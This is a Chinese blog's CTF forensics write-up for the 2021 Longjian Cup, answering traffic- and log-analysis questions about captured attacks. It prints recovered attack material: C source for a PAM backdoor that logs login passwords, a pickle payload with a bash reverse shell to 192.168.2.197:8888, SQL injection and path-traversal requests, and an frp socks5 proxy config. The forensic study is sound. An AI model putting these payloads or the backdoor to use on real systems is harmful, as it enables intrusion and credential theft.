<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><title>Wh1teJ0kerのBlog</title>
<meta charset=utf-8><meta name=description content="Ladder@流量分析练习"><meta name=author content="Wh1teJ0ker"><link rel=canonical href=https://wh1tej0ker.github.io/post/2021-longjian-cup-zysabr.html><link rel=alternate type=application/rss+xml href=https://wh1tej0ker.github.io//index.xml title=Wh1teJ0kerのBlog><script async defer data-website-id=56cc42c1-3656-4d3e-af3c-acded927b8ed src=https://analytics.umami.is/script.js></script><meta property="og:url" content="https://wh1tej0ker.github.io/post/2021-longjian-cup-zysabr.html"><meta property="og:site_name" content="Wh1teJ0kerのBlog"><meta property="og:title" content="2021陇剑杯"><meta property="og:description" content="流量分析练习"><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2024-08-23T21:58:21+08:00"><meta property="article:modified_time" content="2025-11-14T12:21:41+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="2021陇剑杯"><meta name=twitter:description content="流量分析练习"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://wh1tej0ker.github.io/post/"},{"@type":"ListItem","position":2,"name":"2021陇剑杯","item":"https://wh1tej0ker.github.io/post/2021-longjian-cup-zysabr.html"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"2021陇剑杯","name":"2021陇剑杯","description":"流量分析练习","keywords":[],"articleBody":"2021陇剑杯 签到 问一 题目描述 此时正在进行的可能是__协议的网络攻击。（如有字母请全部使用小写，填写样例：http、dns、ftp）。\n此时正在进行的可能是__协议的网络攻击。（如有字母请全部使用小写，填写样例：http、dns、ftp）。\n题解 先对流量包进行协议统计\n发现主要就是存在tcp协议和http协议\ntcp协议是传输层，http是应用层，因此可以判断就是http协议进行的攻\n1 http JWT 问一 题目描述 昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：\n该网站使用了__认证方式。（如有字母请全部使用小写）。\n题解 追踪http协议的流，翻找一下发现存在token，特征很明显是JWT，再配合上题目描述\n可以确定答案是\n1 jwt 问二 题目描述 昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：\n黑客绕过验证使用的jwt中，id和username是__。（中间使用#号隔开，例如1#admin）。\n题解 JSON Web Tokens - jwt.io\n将jwt进行解析，得到\n1 10087#admin 问三 题目描述 昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：\n黑客获取webshell之后，权限是__？。\n题解 追踪tcp流里，挨个查看\n在流10中发现有命令whoami\n回显为alert(\"root\\n\")​\n答案即为\n1 root 问四 题目描述 昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：\n黑客上传的恶意文件文件名是_。(请提交带有文件后缀的文件名，例如x.txt)。\n题解 在流13中发现存在向tmp目录中写入一个1.c的文件\n解码看一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 #include #include #include #include #include #include #include size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp) { return size * nmemb; } void saveMessage(char (*message)[]) { FILE *fp = NULL; fp = fopen(\"/tmp/.looter\", \"a+\"); fputs(*message, fp); fclose(fp); } PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) { return PAM_SUCCESS; } PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) { return PAM_SUCCESS; } PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) { int retval; const char* username; const char* password; char message[1024]; retval = pam_get_user(pamh, \u0026username, \"Username: \"); pam_get_item(pamh, PAM_AUTHTOK, (void *) \u0026password); if (retval != PAM_SUCCESS) { return retval; } snprintf(message,2048,\"Username %s\\nPassword: %s\\n\",username,password); saveMessage(\u0026message); return PAM_SUCCESS; } 并且发现后续黑客又再次查看了该文件，并对其进行了编译链接等操作，最终并再次查看了自身是否为root权限。\n因此，可以确定答案确实为\n1 1.c 问五 题目描述 昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：\n黑客在服务器上编译的恶意so文件，文件名是_。\n题解 在上一题查看后，就已经发现1.c文件有过改动\n并在编译将其复制到了系统文件夹下\n1 looter.so 问六 题目描述 昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：\n黑客在服务器上修改了一个配置文件，文件的绝对路径为_。（请确认绝对路径后再提交）。\n题解 将刚刚的恶意so文件又输入到一个文件夹下，并重新查看确认，可以判断确实为\n1 /etc/pam.d/common-auth webshell 问一 题目描述 单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客登录系统使用的密码是_。\n题解 询问密码是多少，直接尝试搜索字符串pass，发现账户密码直接明文传输的\n1 Admin123!@# 问二 题目描述 黑客修改了一个日志文件，文件的绝对路径为__\n答题格式：\\xx\\xxx\\xxx\\xxx.log\n不区分大小写\n题解 通过搜索log的关键词，发现一个位置日志地址，并且进行了基本的枚举和木马写入操作\n1 data/Runtime/Logs/Home/21_08_07.log 还不对，需要补全\n1 /var/www/html/data/Runtime/Logs/Home/21_08_07.log 问三 题目描述 单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客获取webshell之后，权限是__？\n题解 在刚刚的日志文件左右，发现了几个命令执行的动向，但是唯一成功，有200的仅有流312\n在user/group这里发现现在的用户权限为\n1 www-data 问四 题目描述 单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客写入的webshell文件名是_。\n题解 将流量包继续向下翻，发现在流334附近向下几个都在传输一个名为1.php的文件\n追踪tcp流后很明显的看出是一个蚁剑的流量，可以确定木马就是\n1 1.php 问五 题目描述 单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客上传的代理工具客户端名字是_。\n题解 在流346发现了有frpc.ini，明显的内网穿透工具\n1 frpc 问六 题目描述 单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客代理工具的回连服务端IP是_。\n题解 发现一段奇怪的16进制\n解码后得到\n1 2 3 4 5 6 7 8 9 10 11 12 13 [common] server_addr = 192.168.239.123 server_port = 7778 token=Xa3BJf2l5enmN6Z7A8mv [test_sock5] type = tcp remote_port =8111 plugin = socks5 plugin_user = 0HDFt16cLQJ plugin_passwd = JTN276Gp use_encryption = true use_compression = true 因此得到回连地址\n1 192.168.239.123 问七 题目描述 单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：\n黑客的socks5的连接账号、密码是__。\n题解 根据解码得到的账号密码为\n1 0HDFt16cLQJ#JTN276Gp 日志分析 问一 题目描述 单位某应用程序被攻击，请分析日志，进行作答：\n网络存在源码泄漏，源码文件名是_。\n题解 可以看到明显是在对目录进行信息泄露的爆破\n尝试搜索200\n1 2 172.17.0.1 - - [07/Aug/2021:01:37:59 +0000] \"GET /www%2ezip HTTP/1.1\" 200 1686 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36\" 172.17.0.1 - - [07/Aug/2021:01:37:59 +0000] \"GET /www%2ezip HTTP/1.1\" 200 1686 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36\" 可以看出泄露的源码文件为\n1 www.zip 问二 题目描述 单位某应用程序被攻击，请分析日志，进行作答：\n分析攻击流量，黑客往/tmp目录写入一个文件，文件名为_。\n题解 直接搜索tmp\n1 2 172.17.0.1 - - [07/Aug/2021:01:38:21 +0000] \"GET /?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car\u0026content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D HTTP/1.1\" 302 879 \"-\" \"python-requests/2.26.0\" 172.17.0.1 - - [07/Aug/2021:01:38:21 +0000] \"GET /?file=sess_car HTTP/1.1\" 200 680 \"-\" \"python-requests/2.26.0\" url解码一下\n1 2 172.17.0.1 - - [07/Aug/2021:01:38:21 0000] \"GET /?filename=../../../../../../../../../../../../../../../../../tmp/sess_car\u0026content=func|N;files|a:2:{s:8:\"filename\";s:16:\"./files/filename\";s:20:\"call_user_func_array\";s:28:\"./files/call_user_func_array\";}paths|a:1:{s:5:\"/flag\";s:13:\"SplFileObject\";} HTTP/1.1\" 302 879 \"-\" \"python-requests/2.26.0\" 172.17.0.1 - - [07/Aug/2021:01:38:21 0000] \"GET /?file=sess_car HTTP/1.1\" 200 680 \"-\" \"python-requests/2.26.0\" 可以看出向tmp文件下写入了\n1 sess_car 问三 题目描述 单位某应用程序被攻击，请分析日志，进行作答：\n分析攻击流量，黑客使用的是__类读取了秘密文件\n题解 1 {s:8:\"filename\";s:16:\"./files/filename\";s:20:\"call_user_func_array\";s:28:\"./files/call_user_func_array\";}paths|a:1:{s:5:\"/flag\";s:13:\"SplFileObject\";} 可以看出其中的类为\n1 SplFileObject 简单日志分析 问一 题目描述 某应用程序被攻击，请分析日志后作答：\n黑客攻击的参数是__。（如有字母请全部使用小写）。\n题解 刚开始是明显在进行一个扫目录的操作，在找敏感信息泄露\n唯一可控的攻击参数只有\n1 127.0.0.1 - - [07/Aug/2021 10:43:12] \"GET /?user=STAKcDAKMFMnY2F0IC9UaDRzX0lTX1ZFUllfSW1wb3J0X0ZpMWUnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIu HTTP/1.1\" 500 - 因此答案为\n1 user 问二 题目描述 某应用程序被攻击，请分析日志后作答：\n黑客查看的秘密文件的绝对路径是_。\n题解 先将两个可控参数分别解码得到\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 I0 p0 0S'cat /Th4s_IS_VERY_Import_Fi1e' p1 0(g0 lp2 0(I0 tp3 0(g3 I0 dp4 0cos system p5 0g5 (g1 tR. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 I0 p0 0S'bash -i \u003e\u0026 /dev/tcp/192.168.2.197/8888 0\u003e\u00261' p1 0(g0 lp2 0(I0 tp3 0(g3 I0 dp4 0cos system p5 0g5 (g1 tR. 绝对路径即为\n1 Th4s_IS_VERY_Import_Fi1e 问三 题目描述 某应用程序被攻击，请分析日志后作答：\n黑客反弹shell的ip和端口是_。（格式使用“ip:端口\"，例如127.0.0.1:2333）。\n题解 根据上面解码的结果，即得\n1 192.168.2.197:8888 SQL注入 问一 题目描述 某应用程序被攻击，请分析日志后作答：\n黑客在注入过程中采用的注入手法叫_。\n题解 一眼布尔盲注\n1 布尔盲注 问二 题目描述 某应用程序被攻击，请分析日志后作答：\n黑客在注入过程中，最终获取flag的数据库名、表名和字段名是_。（格式为“数据库名#表名#字段名”，例如database#table#column）。\n题解 1 2 172.17.0.1 - - [01/Sep/2021:01:44:02 +0000] \"GET /index.php?id=1%20and%20if(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name='flag'%20and%20table_schema='sqli'),5,1)%20=%20'+',1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1\" 200 506 \"-\" \"python-requests/2.26.0\" 172.17.0.1 - - [01/Sep/2021:01:45:55 +0000] \"GET /index.php?id=1%20and%20if(substr((select%20flag%20from%20sqli.flag),1,1)%20=%20'%C2%80',1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1\" 200 429 \"-\" \"python-requests/2.26.0\" 取这两段可以看出\n1 sqli#flag#flag 问三 题目描述 某应用程序被攻击，请分析日志后作答：\n黑客最后获取到的flag字符串为_。\n题解 一个布尔盲注的提取，正则匹配一下即可\n1 flag{deddcd67-bcfd-487e-b940-1217e668c7db} ","wordCount":"2812","inLanguage":"en","datePublished":"2024-08-23T21:58:21+08:00","dateModified":"2025-11-14T12:21:41+08:00","author":{"@type":"Person","name":"Wh1teJ0ker"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://wh1tej0ker.github.io/post/2021-longjian-cup-zysabr.html"},"publisher":{"@type":"Organization","name":"Wh1teJ0kerのBlog","logo":{"@type":"ImageObject","url":"https://wh1tej0ker.github.io/favicon.ico"}}}</script><link rel=icon type=image/png href=/favicon.ico sizes=16x16><link rel=apple-touch-icon href=/favicon.ico><link rel=manifest href=/favicon.ico><link rel=stylesheet href=https://cdn.staticfile.org/lxgw-wenkai-webfont/1.6.0/style.css><link rel=stylesheet href=/css/main.min.9d998bab4720091d5ec1e0fbbffd92b254a2e791623df6106cd7ea760bfc5c28.css integrity="sha256-nZmLq0cgCR1eweD7v/2SslSi55FiPfYQbNfqdgv8XCg=" crossorigin=anonymous media=screen><link rel=stylesheet href=/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css><script src=/js/highlight.min.min.c607d6febd16934a82eb61d3a896ed9d869f54373cc63ce95864ed5488fe3128.js></script><script>hljs.highlightAll()</script></head><body><main class=wrapper><nav class=navigation><section class=container><a class=navigation-brand href=/>HOME
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><span></span><span></span><span></span></label><ul class=navigation-list id=navigation-list><li class="navigation-item navigation-menu"><a class=navigation-link href=/categories/>分类</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/archives/>归档</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/friends/>友链</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/about/>关于</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=https://cloud.umami.is/share/5RZUCwaG2fOysYPa/wh1tej0ker.github.io>Dashboard</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class="navigation-item navigation-social"><a class=navigation-link href=https://github.com/Wh1teJ0ker><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></li></ul></section></nav><div id=content><article class=blog-single><header class=blog-title><h1>2021陇剑杯</h1></header><p><small>August 23, 2024&nbsp;· &nbsp;·</small><p><div class=blog-toc><nav id=TableOfContents><ul><li><a href=#问一>问一</a><ul><li><a href=#题目描述>题目描述</a></li><li><a href=#题解>题解</a></li></ul></li></ul><ul><li><a href=#问一-1>问一</a><ul><li><a href=#题目描述-1>题目描述</a></li><li><a href=#题解-1>题解</a></li></ul></li><li><a href=#问二>问二</a><ul><li><a href=#题目描述-2>题目描述</a></li><li><a href=#题解-2>题解</a></li></ul></li><li><a href=#问三>问三</a><ul><li><a href=#题目描述-3>题目描述</a></li><li><a href=#题解-3>题解</a></li></ul></li><li><a href=#问四>问四</a><ul><li><a href=#题目描述-4>题目描述</a></li><li><a href=#题解-4>题解</a></li></ul></li><li><a href=#问五>问五</a><ul><li><a href=#题目描述-5>题目描述</a></li><li><a href=#题解-5>题解</a></li></ul></li><li><a href=#问六>问六</a><ul><li><a href=#题目描述-6>题目描述</a></li><li><a href=#题解-6>题解</a></li></ul></li></ul><ul><li><a href=#问一-2>问一</a><ul><li><a href=#题目描述-7>题目描述</a></li><li><a href=#题解-7>题解</a></li></ul></li><li><a href=#问二-1>问二</a><ul><li><a href=#题目描述-8>题目描述</a></li><li><a href=#题解-8>题解</a></li></ul></li><li><a href=#问三-1>问三</a><ul><li><a href=#题目描述-9>题目描述</a></li><li><a href=#题解-9>题解</a></li></ul></li><li><a href=#问四-1>问四</a><ul><li><a href=#题目描述-10>题目描述</a></li><li><a href=#题解-10>题解</a></li></ul></li><li><a href=#问五-1>问五</a><ul><li><a href=#题目描述-11>题目描述</a></li><li><a href=#题解-11>题解</a></li></ul></li><li><a href=#问六-1>问六</a><ul><li><a href=#题目描述-12>题目描述</a></li><li><a href=#题解-12>题解</a></li></ul></li><li><a href=#问七>问七</a><ul><li><a href=#题目描述-13>题目描述</a></li><li><a href=#题解-13>题解</a></li></ul></li></ul><ul><li><a href=#问一-3>问一</a><ul><li><a href=#题目描述-14>题目描述</a></li><li><a href=#题解-14>题解</a></li></ul></li><li><a href=#问二-2>问二</a><ul><li><a href=#题目描述-15>题目描述</a></li><li><a href=#题解-15>题解</a></li></ul></li><li><a href=#问三-2>问三</a><ul><li><a href=#题目描述-16>题目描述</a></li><li><a href=#题解-16>题解</a></li></ul></li></ul><ul><li><a href=#问一-4>问一</a><ul><li><a href=#题目描述-17>题目描述</a></li><li><a href=#题解-17>题解</a></li></ul></li><li><a href=#问二-3>问二</a><ul><li><a href=#题目描述-18>题目描述</a></li><li><a href=#题解-18>题解</a></li></ul></li><li><a href=#问三-3>问三</a><ul><li><a href=#题目描述-19>题目描述</a></li><li><a href=#题解-19>题解</a></li></ul></li></ul><ul><li><a href=#问一-5>问一</a><ul><li><a href=#题目描述-20>题目描述</a></li><li><a href=#题解-20>题解</a></li></ul></li><li><a href=#问二-4>问二</a><ul><li><a href=#题目描述-21>题目描述</a></li><li><a href=#题解-21>题解</a></li></ul></li><li><a href=#问三-4>问三</a><ul><li><a href=#题目描述-22>题目描述</a></li><li><a href=#题解-22>题解</a></li></ul></li></ul></nav></div><section class=blog-content><h1 id=2021陇剑杯>2021陇剑杯</h1><h1 id=签到>签到</h1><h2 id=问一>问一</h2><h3 id=题目描述>题目描述</h3><p>此时正在进行的可能是__协议的网络攻击。（如有字母请全部使用小写，填写样例：http、dns、ftp）。</p><p>此时正在进行的可能是__协议的网络攻击。（如有字母请全部使用小写，填写样例：http、dns、ftp）。</p><h3 id=题解>题解</h3><p>先对流量包进行协议统计</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958180570-39bb3644-7b61-45fd-a07e-73b94e117aca-20240823215848-g76aynn.png alt=1713958180570-39bb3644-7b61-45fd-a07e-73b94e117aca></p><p>发现主要就是存在tcp协议和http协议</p><p>tcp协议是传输层，http是应用层，因此可以判断就是http协议进行的攻</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>http
</span></span></code></pre></td></tr></table></div></div><h1 id=jwt>JWT</h1><h2 id=问一-1>问一</h2><h3 id=题目描述-1>题目描述</h3><p>昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：</p><p>该网站使用了__认证方式。（如有字母请全部使用小写）。</p><h3 id=题解-1>题解</h3><p>追踪http协议的流，翻找一下发现存在token，特征很明显是JWT，再配合上题目描述</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958208916-cf60cc27-18ce-42a3-b8a2-b1da37b1d010-20240823215848-o57ca69.png alt=1713958208916-cf60cc27-18ce-42a3-b8a2-b1da37b1d010></p><p>可以确定答案是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>jwt
</span></span></code></pre></td></tr></table></div></div><h2 id=问二>问二</h2><h3 id=题目描述-2>题目描述</h3><p>昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：</p><p>黑客绕过验证使用的jwt中，id和username是__。（中间使用#号隔开，例如1#admin）。</p><h3 id=题解-2>题解</h3><p><a href=https://jwt.io/>JSON Web Tokens - jwt.io</a></p><p>将jwt进行解析，得到</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958230763-60743f6f-43b4-4b5a-8b8d-ae9173b82e3f-20240823215849-eley2q9.png alt=1713958230763-60743f6f-43b4-4b5a-8b8d-ae9173b82e3f></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>10087#admin
</span></span></code></pre></td></tr></table></div></div><h2 id=问三>问三</h2><h3 id=题目描述-3>题目描述</h3><p>昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：<br>黑客获取webshell之后，权限是__？。</p><h3 id=题解-3>题解</h3><p>追踪tcp流里，挨个查看</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958246909-2c95fc74-8352-4e6c-8270-10b718d9cfba-20240823215849-cout809.png alt=1713958246909-2c95fc74-8352-4e6c-8270-10b718d9cfba></p><p>在流10中发现有命令whoami</p><p>回显为<code>alert("root\n")</code>​</p><p>答案即为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>root
</span></span></code></pre></td></tr></table></div></div><h2 id=问四>问四</h2><h3 id=题目描述-4>题目描述</h3><p>昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：<br>黑客上传的恶意文件文件名是_。(请提交带有文件后缀的文件名，例如x.txt)。</p><h3 id=题解-4>题解</h3><p>在流13中发现存在向tmp目录中写入一个1.c的文件</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958348296-baeb39c2-f643-4077-a867-6a33133068cd-20240823215849-t02rgx0.png alt=1713958348296-baeb39c2-f643-4077-a867-6a33133068cd></p><p>解码看一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;curl/curl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;security/pam_appl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;security/pam_modules.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>size_t</span> <span class=nf>write_data</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>buffer</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>size</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>nmemb</span><span class=p>,</span> <span class=kt>void</span> <span class=o>*</span><span class=n>userp</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=n>size</span> <span class=o>*</span> <span class=n>nmemb</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>saveMessage</span><span class=p>(</span><span class=kt>char</span> <span class=p>(</span><span class=o>*</span><span class=n>message</span><span class=p>)[])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=n>FILE</span> <span class=o>*</span><span class=n>fp</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>fp</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;/tmp/.looter&#34;</span><span class=p>,</span> <span class=s>&#34;a+&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>fputs</span><span class=p>(</span><span class=o>*</span><span class=n>message</span><span class=p>,</span> <span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>fclose</span><span class=p>(</span><span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PAM_EXTERN</span> <span class=kt>int</span> <span class=nf>pam_sm_setcred</span><span class=p>(</span> <span class=kt>pam_handle_t</span> <span class=o>*</span><span class=n>pamh</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>,</span> <span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=n>PAM_SUCCESS</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PAM_EXTERN</span> <span class=kt>int</span> <span class=nf>pam_sm_acct_mgmt</span><span class=p>(</span><span class=kt>pam_handle_t</span> <span class=o>*</span><span class=n>pamh</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>,</span> <span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=n>PAM_SUCCESS</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PAM_EXTERN</span> <span class=kt>int</span> <span class=nf>pam_sm_authenticate</span><span class=p>(</span> <span class=kt>pam_handle_t</span> <span class=o>*</span><span class=n>pamh</span><span class=p>,</span> <span class=kt>int</span> <span class=n>flags</span><span class=p>,</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span> <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>retval</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>username</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>password</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>message</span><span class=p>[</span><span class=mi>1024</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=n>retval</span> <span class=o>=</span> <span class=nf>pam_get_user</span><span class=p>(</span><span class=n>pamh</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>username</span><span class=p>,</span> <span class=s>&#34;Username: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>pam_get_item</span><span class=p>(</span><span class=n>pamh</span><span class=p>,</span> <span class=n>PAM_AUTHTOK</span><span class=p>,</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=o>&amp;</span><span class=n>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>retval</span> <span class=o>!=</span> <span class=n>PAM_SUCCESS</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=n>retval</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
